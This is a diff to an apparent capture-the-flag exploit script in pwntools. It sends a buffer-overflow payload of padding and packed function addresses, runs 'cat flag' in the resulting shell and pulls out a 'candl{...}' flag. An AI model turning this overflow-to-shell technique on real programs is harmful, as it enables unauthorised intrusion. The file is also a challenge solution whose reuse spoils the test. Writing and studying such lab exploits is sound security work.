@@ -42,13 +42,12 @@ printf_addr = elf.symbols["printf"]
 payload = b"A" * max_len + p32(some_function_addr) + p32(read_addr) + p32(printf_addr) + p32(0x3) + p32(buffer_address) + p32(max_len)
 
 io.send(payload)
-print(io.recvall())
-os.unlink("./a.txt")
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
 # import re
-# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
-# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-# print(flag)
+io.sendlineafter(b'!', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
+os.unlink("./a.txt")
